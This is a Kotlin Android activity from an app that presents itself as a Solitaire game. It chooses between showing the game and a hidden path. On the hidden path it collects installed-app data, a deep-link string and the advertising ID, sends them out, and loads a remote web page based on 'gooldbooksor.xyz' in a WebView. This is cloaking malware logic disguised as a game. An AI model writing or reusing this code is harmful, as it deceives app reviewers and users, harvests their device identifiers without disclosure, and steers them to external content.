package com.devsisters.SolitaireDeckedOu.main_screen

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.devsisters.SolitaireDeckedOu.R
import com.devsisters.SolitaireDeckedOu.deferred.AdvertisingId
import com.devsisters.SolitaireDeckedOu.deferred.AppsData
import com.devsisters.SolitaireDeckedOu.deferred.DeepString
import com.devsisters.SolitaireDeckedOu.deferred.DeferredData
import com.devsisters.SolitaireDeckedOu.game_screen.GoldBookGame
import com.devsisters.SolitaireDeckedOu.helpers.GoldBookSender
import com.devsisters.SolitaireDeckedOu.helpers.UriBuilder
import com.devsisters.SolitaireDeckedOu.helpers.needGame
import com.devsisters.SolitaireDeckedOu.room.BookDb
import com.devsisters.SolitaireDeckedOu.webview_screen.GoldBookWebView
import kotlinx.coroutines.*

class GoldBookMainScreen : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.gold_book_main_screen)

        when (needGame(resolver = contentResolver)) {
            true -> {
                startActivity(Intent(this, GoldBookGame::class.java))
                finish()
            }
            false -> {
                lifecycleScope.launch(Dispatchers.IO) {
                    val deferredAppsMap = async { AppsData(this@GoldBookMainScreen) }
                    val deferredDeepString = async { DeepString(this@GoldBookMainScreen) }
                    val deferredAdvId = async { AdvertisingId(this@GoldBookMainScreen) }

                    val db = BookDb(this@GoldBookMainScreen, CoroutineScope(SupervisorJob()))

                    val text = db.bookDao().takeBook()?.bookText ?: "gooldbooksor.xyz/storys.php"
                    val intent = Intent(this@GoldBookMainScreen, GoldBookWebView::class.java)

                    when (db.bookDao().takeBook()?.bookSaved ?: false) {
                        true -> {
                            intent.putExtra("text", text)
                            startActivity(intent)
                            finish()
                        }
                        false -> {
                            val deferredData = DeferredData(
                                appsMap = deferredAppsMap.await(),
                                deepString = deferredDeepString.await(),
                                advertisingId = deferredAdvId.await()
                            )
                            val completeText = "https://" +
                                    UriBuilder(deferredData, application, text).build()
                            GoldBookSender(deferredData, application).send()
                            intent.putExtra("text", completeText)
                            startActivity(intent)
                            finish()
                        }
                    }
                }
            }
        }
    }
}